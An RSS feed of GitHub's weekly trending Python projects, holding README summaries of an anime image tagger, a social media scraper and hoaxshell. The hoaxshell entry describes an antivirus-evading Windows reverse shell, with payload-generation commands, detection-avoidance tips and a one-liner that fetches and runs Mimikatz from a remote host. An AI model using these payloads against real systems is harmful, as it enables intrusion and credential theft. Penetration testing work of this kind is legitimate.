<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-10-23T01:49:33Z</updated>
  <subtitle>Weekly Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>KichangKim/DeepDanbooru</title>
    <updated>2022-10-23T01:49:33Z</updated>
    <id>tag:github.com,2022-10-23:/KichangKim/DeepDanbooru</id>
    <link href="https://github.com/KichangKim/DeepDanbooru" rel="alternate"></link>
    <summary type="html">&lt;p&gt;AI based multi-label girl image classification system, implemented by using TensorFlow.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;DeepDanbooru&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.python.org/doc/versions/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/python-3.6-green&#34; alt=&#34;Python&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opensource.org/licenses/MIT&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/KichangKim/DeepDanbooru&#34; alt=&#34;GitHub&#34;&gt;&lt;/a&gt; &lt;a href=&#34;http://kanotype.iptime.org:8003/deepdanbooru/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/web%20demo-20200915-brightgreen&#34; alt=&#34;Web&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;DeepDanbooru&lt;/strong&gt; is anime-style girl image tag estimation system. You can estimate your images on my live demo site, &lt;a href=&#34;http://dev.kanotype.net:8003/deepdanbooru/&#34;&gt;DeepDanbooru Web&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;DeepDanbooru is written by Python 3.7. Following packages are need to be installed.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;tensorflow&amp;gt;=2.7.0&lt;/li&gt; &#xA; &lt;li&gt;tensorflow-io&amp;gt;=2.22.0&lt;/li&gt; &#xA; &lt;li&gt;Click&amp;gt;=7.0&lt;/li&gt; &#xA; &lt;li&gt;numpy&amp;gt;=1.16.2&lt;/li&gt; &#xA; &lt;li&gt;requests&amp;gt;=2.22.0&lt;/li&gt; &#xA; &lt;li&gt;scikit-image&amp;gt;=0.15.0&lt;/li&gt; &#xA; &lt;li&gt;six&amp;gt;=1.13.0&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Or just use &lt;code&gt;requirements.txt&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;alternatively you can install it with pip. Note that by default, tensorflow is not included.&lt;/p&gt; &#xA;&lt;p&gt;To install it with tensorflow, add &lt;code&gt;tensorflow&lt;/code&gt; extra package.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; # default installation&#xA;&amp;gt; pip install .&#xA;&amp;gt; # with tensorflow package&#xA;&amp;gt; pip install .[tensorflow]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Prepare dataset. If you don&#39;t have, you can use &lt;a href=&#34;https://github.com/KichangKim/DanbooruDownloader&#34;&gt;DanbooruDownloader&lt;/a&gt; for download the dataset of &lt;a href=&#34;https://danbooru.donmai.us/&#34;&gt;Danbooru&lt;/a&gt;. If you want to make your own dataset, see &lt;a href=&#34;https://raw.githubusercontent.com/KichangKim/DeepDanbooru/master/#dataset-structure&#34;&gt;Dataset Structure&lt;/a&gt; section.&lt;/li&gt; &#xA; &lt;li&gt;Create training project folder.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; deepdanbooru create-project [your_project_folder]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;Prepare tag list. If you want to use latest tags, use following command. It downloads tag from Danbooru server.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; deepdanbooru download-tags [your_project_folder]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;(Option) Filtering dataset. If you want to train with optional tags (rating and score), you should convert it as system tags.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; deepdanbooru make-training-database [your_dataset_sqlite_path] [your_filtered_sqlite_path]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt;Modify &lt;code&gt;project.json&lt;/code&gt; in the project folder. You should change &lt;code&gt;database_path&lt;/code&gt; setting to your actual sqlite file path.&lt;/li&gt; &#xA; &lt;li&gt;Start training.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; deepdanbooru train-project [your_project_folder]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;7&#34;&gt; &#xA; &lt;li&gt;Enjoy it.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; deepdanbooru evaluate [image_file_path or folder]... --project-path [your_project_folder] --allow-folder&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Dataset Structure&lt;/h2&gt; &#xA;&lt;p&gt;DeepDanbooru uses following folder structure for input dataset. SQLite file can be any name, but must be located in same folder to &lt;code&gt;images&lt;/code&gt; folder.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;MyDataset/&#xA;├── images/&#xA;│   ├── 00/&#xA;│   │   ├── 00000000000000000000000000000000.jpg&#xA;│   │   ├── ...&#xA;│   ├── 01/&#xA;│   │   ├── ...&#xA;│   └── ff/&#xA;│       ├── ...&#xA;└── my-dataset.sqlite&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The core is SQLite database file. That file must be contains following table structure.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;posts&#xA;├── id (INTEGER)&#xA;├── md5 (TEXT)&#xA;├── file_ext (TEXT)&#xA;├── tag_string (TEXT)&#xA;└── tag_count_general (INTEGER)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The filename of image must be &lt;code&gt;[md5].[file_ext]&lt;/code&gt;. If you use your own images, &lt;code&gt;md5&lt;/code&gt; don&#39;t have to be actual MD5 hash value.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;tag_string&lt;/code&gt; is space splitted tag list, like &lt;code&gt;1girl ahoge long_hair&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;tag_count_general&lt;/code&gt; is used for the project setting, &lt;code&gt;minimum_tag_count&lt;/code&gt;. Images which has equal or larger value of &lt;code&gt;tag_count_general&lt;/code&gt; are used for training.&lt;/p&gt; &#xA;&lt;h2&gt;Project Structure&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Project&lt;/strong&gt; is minimal unit for training on DeepDanbooru. You can modify various parameters for training.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;MyProject/&#xA;├── project.json&#xA;└── tags.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;tags.txt&lt;/code&gt; contains all tags for estimating. You can make your own list or download latest tags from Danbooru server. It is simple newline-separated file like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;1girl&#xA;ahoge&#xA;...&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>JustAnotherArchivist/snscrape</title>
    <updated>2022-10-23T01:49:33Z</updated>
    <id>tag:github.com,2022-10-23:/JustAnotherArchivist/snscrape</id>
    <link href="https://github.com/JustAnotherArchivist/snscrape" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A social networking service scraper in Python&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;snscrape&lt;/h1&gt; &#xA;&lt;p&gt;snscrape is a scraper for social networking services (SNS). It scrapes things like user profiles, hashtags, or searches and returns the discovered items, e.g. the relevant posts.&lt;/p&gt; &#xA;&lt;p&gt;The following services are currently supported:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Facebook: user profiles, groups, and communities (aka visitor posts)&lt;/li&gt; &#xA; &lt;li&gt;Instagram: user profiles, hashtags, and locations&lt;/li&gt; &#xA; &lt;li&gt;Mastodon: user profiles and toots (single or thread)&lt;/li&gt; &#xA; &lt;li&gt;Reddit: users, subreddits, and searches (via Pushshift)&lt;/li&gt; &#xA; &lt;li&gt;Telegram: channels&lt;/li&gt; &#xA; &lt;li&gt;Twitter: users, user profiles, hashtags, searches, tweets (single or surrounding thread), list posts, and trends&lt;/li&gt; &#xA; &lt;li&gt;VKontakte: user profiles&lt;/li&gt; &#xA; &lt;li&gt;Weibo (Sina Weibo): user profiles&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;snscrape requires Python 3.8 or higher. The Python package dependencies are installed automatically when you install snscrape.&lt;/p&gt; &#xA;&lt;p&gt;Note that one of the dependencies, lxml, also requires libxml2 and libxslt to be installed.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;pip3 install snscrape&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to use the development version:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;pip3 install git+https://github.com/JustAnotherArchivist/snscrape.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;CLI&lt;/h3&gt; &#xA;&lt;p&gt;The generic syntax of snscrape&#39;s CLI is:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;snscrape [GLOBAL-OPTIONS] SCRAPER-NAME [SCRAPER-OPTIONS] [SCRAPER-ARGUMENTS...]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;snscrape --help&lt;/code&gt; and &lt;code&gt;snscrape SCRAPER-NAME --help&lt;/code&gt; provide details on the options and arguments. &lt;code&gt;snscrape --help&lt;/code&gt; also lists all available scrapers.&lt;/p&gt; &#xA;&lt;p&gt;The default output of the CLI is the URL of each result.&lt;/p&gt; &#xA;&lt;p&gt;Some noteworthy global options are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;--jsonl&lt;/code&gt; to get output as JSONL. This includes all information extracted by snscrape (e.g. message content, datetime, images; details vary by scraper).&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;--max-results NUMBER&lt;/code&gt; to only return the first &lt;code&gt;NUMBER&lt;/code&gt; results.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;--with-entity&lt;/code&gt; to get an item on the entity being scraped, e.g. the user or channel. This is not supported on all scrapers. (You can use this together with &lt;code&gt;--max-results 0&lt;/code&gt; to only fetch the entity info.)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Examples&lt;/h4&gt; &#xA;&lt;p&gt;Collect all tweets by Jason Scott (@textfiles):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;snscrape twitter-user textfiles&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It&#39;s usually useful to redirect the output to a file for further processing, e.g. in bash using the filename &lt;code&gt;twitter-@textfiles&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;snscrape twitter-user textfiles &amp;gt;twitter-@textfiles&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To get the latest 100 tweets with the hashtag #archiveteam:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;snscrape --max-results 100 twitter-hashtag archiveteam&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Library&lt;/h3&gt; &#xA;&lt;p&gt;It is also possible to use snscrape as a library in Python, but this is currently undocumented.&lt;/p&gt; &#xA;&lt;h2&gt;Issue reporting&lt;/h2&gt; &#xA;&lt;p&gt;If you discover an issue with snscrape, please report it at &lt;a href=&#34;https://github.com/JustAnotherArchivist/snscrape/issues&#34;&gt;https://github.com/JustAnotherArchivist/snscrape/issues&lt;/a&gt;. If possible please run snscrape with &lt;code&gt;-vv&lt;/code&gt; and &lt;code&gt;--dump-locals&lt;/code&gt; and include the log output as well as the dump files referenced in the log in the issue. Note that the files may contain sensitive information in some cases and could potentially be used to identify you (e.g. if the service includes your IP address in its response). If you prefer to arrange a file transfer privately, just mention that in the issue.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.&lt;/p&gt; &#xA;&lt;p&gt;This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.&lt;/p&gt; &#xA;&lt;p&gt;You should have received a copy of the GNU General Public License along with this program. If not, see &lt;a href=&#34;https://www.gnu.org/licenses/&#34;&gt;https://www.gnu.org/licenses/&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>t3l3machus/hoaxshell</title>
    <updated>2022-10-23T01:49:33Z</updated>
    <id>tag:github.com,2022-10-23:/t3l3machus/hoaxshell</id>
    <link href="https://github.com/t3l3machus/hoaxshell" rel="alternate"></link>
    <summary type="html">&lt;p&gt;An unconventional Windows reverse shell, currently undetected by Microsoft Defender and various other AV solutions, solely based on http(s) traffic.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;hoaxshell&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.python.org/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/python-%E2%89%A5%203.6-yellow.svg?sanitize=true&#34; alt=&#34;Python&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/badge/powershell-%E2%89%A5%20v3.0-blue&#34;&gt; &lt;a href=&#34;https://svgshare.com/i/Zhy.svg&#34;&gt;&lt;img src=&#34;https://svgshare.com/i/Zhy.svg?sanitize=true&#34; alt=&#34;Linux&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/t3l3machus/hoaxshell/raw/main/LICENSE.md&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-BSD-red.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/badge/Maintained%3F-Yes-96c40f&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Purpose&lt;/h2&gt; &#xA;&lt;p&gt;&lt;span&gt;⚠&lt;/span&gt; &lt;strong&gt;Update&lt;/strong&gt;: As of 2022-10-18, hoaxshell is detected by AMSI (&lt;a href=&#34;https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=VirTool%3aPowerShell%2fXoashell.A&amp;amp;threatid=2147833654&#34;&gt;malware-encyclopedia&lt;/a&gt;). I added the -o (--obfuscate) option that seems to make generated payloads undetectable (for now). I will try to enhance the auto-obfuscate function in the future.&lt;/p&gt; &#xA;&lt;p&gt;hoaxshell is an unconventional Windows reverse shell, currently undetected by Microsoft Defender and possibly other AV solutions (check &lt;a href=&#34;https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/#AV-Bypass-PoCs&#34;&gt;PoC table&lt;/a&gt; for more info), solely based on http(s) traffic. The tool is easy to use, it generates it&#39;s own PowerShell payload and it supports encryption (ssl). Tested against fully updated &lt;strong&gt;Windows 11 Enterprise&lt;/strong&gt;, &lt;strong&gt;Windows Server 2016 Datacenter&lt;/strong&gt; and &lt;strong&gt;Windows 10 Pro&lt;/strong&gt; boxes.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;: Purely made for testing and educational purposes. DO NOT run the payloads generated by this tool against hosts that you do not have explicit permission and authorization to test. You are responsible for any trouble you may cause by using this tool.&lt;/p&gt; &#xA;&lt;h3&gt;Video Presentations&lt;/h3&gt; &#xA;&lt;p&gt;[2022-10-11] Recent &amp;amp; awesome, made by @JohnHammond -&amp;gt; &lt;a href=&#34;https://www.youtube.com/watch?v=fgSARG82TJY&#34;&gt;youtube.com/watch?v=fgSARG82TJY&lt;/a&gt;&lt;br&gt; [2022-07-15] Original release demo, made by me -&amp;gt; &lt;a href=&#34;https://www.youtube.com/watch?v=SEufgD5UxdU&#34;&gt;youtube.com/watch?v=SEufgD5UxdU&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Screenshots&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/75489922/196024757-fcb13b73-153c-426f-a87c-bf35fd3e784d.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Find more screenshots &lt;a href=&#34;https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/screenshots/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/t3l3machus/hoaxshell&#xA;cd ./hoaxshell&#xA;sudo pip3 install -r requirements.txt&#xA;chmod +x hoaxshell.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: As a means of avoiding detection, hoaxshell is automatically generating random values for the session id, URL paths and name of a custom http header utilized in the process, every time the script is started. The generated payload will work only for the instance it was generated for. Use the &lt;code&gt;-g&lt;/code&gt; option to bypass this behaviour and re-establish an active session or reuse a past generated payload with a new instance of hoaxshell.&lt;/p&gt; &#xA;&lt;h3&gt;Basic shell session over http&lt;/h3&gt; &#xA;&lt;p&gt;When you run hoaxshell, it will generate its own PowerShell payload for you to copy and inject on the victim. By default, the payload is base64 encoded for convenience. If you need the payload raw, execute the &#34;rawpayload&#34; prompt command or start hoaxshell with the &lt;code&gt;-r&lt;/code&gt; argument. After the payload has been executed on the victim, you&#39;ll be able to run PowerShell commands against it.&lt;/p&gt; &#xA;&lt;h4&gt;Payload that utilizes &lt;code&gt;Invoke-Expression&lt;/code&gt; (default)&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Payload that writes and executes commands from a file&lt;/h4&gt; &#xA;&lt;p&gt;Use &lt;code&gt;-x&lt;/code&gt; to provide a .ps1 file name (absolute path) to be created on the victim machine. You should check the raw payload before executing, make sure the path you provided is solid.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt; -x &#34;C:\Users\\\$env:USERNAME\.local\hack.ps1&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Recommended usage to avoid detection (over http)&lt;/h3&gt; &#xA;&lt;p&gt;Hoaxshell utilizes an http header to transfer shell session info. By default, the header is given a random name which can be detected by regex-based AV rules. Use -H to provide a standard or custom http header name to avoid detection.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt; -i -H &#34;Authorization&#34;&#xA;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt; -i -H &#34;Authorization&#34; -x &#34;C:\Users\\\$env:USERNAME\.local\hack.ps1&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Encrypted shell session (https + self-signed certificate)&lt;/h3&gt; &#xA;&lt;p&gt;This particular payload is kind of a red flag, as it begins with an additional block of code that instructs PowerShell to skip SSL certificate checks, which makes it suspicious and easy to detect as well as significantly longer in length. Not recommended.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Generate self-signed certificate:&#xA;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365&#xA;&#xA;# Pass the cert.pem and key.pem as arguments:&#xA;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt; -c &amp;lt;/path/to/cert.pem&amp;gt; -k &amp;lt;path/to/key.pem&amp;gt;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Encrypted shell session with a trusted certificate&lt;/h3&gt; &#xA;&lt;p&gt;If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -s &amp;lt;your.domain.com&amp;gt; -t -c &amp;lt;/path/to/cert.pem&amp;gt; -k &amp;lt;path/to/key.pem&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Grab session mode&lt;/h3&gt; &#xA;&lt;p&gt;In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in grab session mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt; -g&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: Make sure to start hoaxshell with the same settings as the session you are trying to restore (http/https, port, etc).&lt;/p&gt; &#xA;&lt;h3&gt;Constraint language mode support&lt;/h3&gt; &#xA;&lt;p&gt;Use any of the payload variations with the &lt;code&gt;-cm&lt;/code&gt; (--constraint-mode) option to generate a payload that works even if the victim is configured to run PS in Constraint Language mode. By using this option, you sacrifice a bit of your reverse shell&#39;s stdout decoding accuracy.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt; -cm&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/75489922/195785804-7fa3da9b-a10f-4c72-895a-0648271e7ec6.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Shell session over https using tunneling tools (&lt;a href=&#34;https://ngrok.com&#34;&gt;Ngrok&lt;/a&gt; / &lt;a href=&#34;https://localtunnel.me&#34;&gt;LocalTunnel&lt;/a&gt;)&lt;/h3&gt; &#xA;&lt;p&gt;Utilize tunnelling programmes &lt;strong&gt;Ngrok&lt;/strong&gt; or &lt;strong&gt;LocalTunnel&lt;/strong&gt; to get sessions through secure tunnels, overcominge issues like not having a Static IP address or your ISP forbidding Port-Forwarding.&lt;/p&gt; &#xA;&lt;p&gt;Use &lt;code&gt;-ng&lt;/code&gt; or &lt;code&gt;--ngrok&lt;/code&gt; for Ngrok server&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -ng&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Use &lt;code&gt;-lt&lt;/code&gt; or &lt;code&gt;--localtunnel&lt;/code&gt; for LocalTunnel server&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -lt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Limitations&lt;/h2&gt; &#xA;&lt;p&gt;The shell is going to hang if you execute a command that initiates an interactive session. Example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# this command will execute succesfully and you will have no problem: &#xA;&amp;gt; powershell echo &#39;This is a test&#39;&#xA;&#xA;# But this one will open an interactive session within the hoaxshell session and is going to cause the shell to hang:&#xA;&amp;gt; powershell&#xA;&#xA;# In the same manner, you won&#39;t have a problem executing this:&#xA;&amp;gt; cmd /c dir /a&#xA;&#xA;# But this will cause your hoaxshell to hang:&#xA;&amp;gt; cmd.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;So, if you for example would like to run mimikatz throught hoaxshell you would need to invoke the commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;hoaxshell &amp;gt; IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.13:4443/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Command &#39;&#34;PRIVILEGE::Debug&#34;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Long story short, you have to be careful to not run an exe or cmd that starts an interactive session within the hoaxshell powershell context.&lt;/p&gt; &#xA;&lt;h2&gt;AV Bypass PoCs&lt;/h2&gt; &#xA;&lt;p&gt;Some awesome people were kind enough to send me/publish PoC videos of executing hoaxshell&#39;s payloads against systems running AV solutions other than MS Defender, without being detected. Below is a reference table with links:&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: I don&#39;t know if you can still use hoaxshell effectively to bypass these solutions. It&#39;s only reasonable to assume the detectability will change soon (if not already).&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;AV Solution&lt;/th&gt; &#xA;   &lt;th&gt;Date&lt;/th&gt; &#xA;   &lt;th&gt;PoC&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;SentinelOne&lt;/td&gt; &#xA;   &lt;td&gt;2022-10-18&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://twitter.com/i/status/1582137400880336896&#34;&gt;https://twitter.com/i/status/1582137400880336896&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Norton&lt;/td&gt; &#xA;   &lt;td&gt;2022-10-17&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://twitter.com/i/status/1582278579244929024&#34;&gt;https://twitter.com/i/status/1582278579244929024&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Bitdefender&lt;/td&gt; &#xA;   &lt;td&gt;2022-10-15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.linkedin.com/posts/rohitjain-19_hoaxshell-cy83rr0h1t-penetrationtesting-activity-6987080745139765248-8cdT?utm_source=share&amp;amp;utm_medium=member_desktop&#34;&gt;https://www.linkedin.com/posts/rohitjain-19_hoaxshell-cy83rr0h1t-penetrationtesting-activity-6987080745139765248-8cdT?utm_source=share&amp;amp;utm_medium=member_desktop&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;McAfee&lt;/td&gt; &#xA;   &lt;td&gt;2022-10-15&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://twitter.com/i/status/1581605531365814273&#34;&gt;https://twitter.com/i/status/1581605531365814273&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Kaspersky&lt;/td&gt; &#xA;   &lt;td&gt;2022-10-13&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=IyMH_eCC4Rk&#34;&gt;https://www.youtube.com/watch?v=IyMH_eCC4Rk&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Sophos&lt;/td&gt; &#xA;   &lt;td&gt;2022-09-08&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=NYR0rWx4x8k&#34;&gt;https://www.youtube.com/watch?v=NYR0rWx4x8k&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;News&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;13/10/2022&lt;/code&gt; - Added constraint language mode support (-cm) option.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;08/10/2022&lt;/code&gt; - Added the &lt;code&gt;-ng&lt;/code&gt; and &lt;code&gt;-lt&lt;/code&gt; options that generate PS payloads for obtaining sessions using tunnelling tools &lt;strong&gt;ngrok&lt;/strong&gt; or &lt;strong&gt;localtunnel&lt;/strong&gt; in order to get around limitations like Static IP addresses and Port-Forwarding.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;06/09/2022&lt;/code&gt; - A new payload was added that writes the commands to be executed in a file instead of utilizing &lt;code&gt;Invoke-Expression&lt;/code&gt;. To use this, the user must provide a .ps1 file name (absolute path) on the victim machine using the &lt;code&gt;-x&lt;/code&gt; option.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;04/09/2022&lt;/code&gt; - Modifications were made to improve the command delivery mechanism as it included components that could be easily flagged. The &lt;code&gt;-t&lt;/code&gt; option along with the 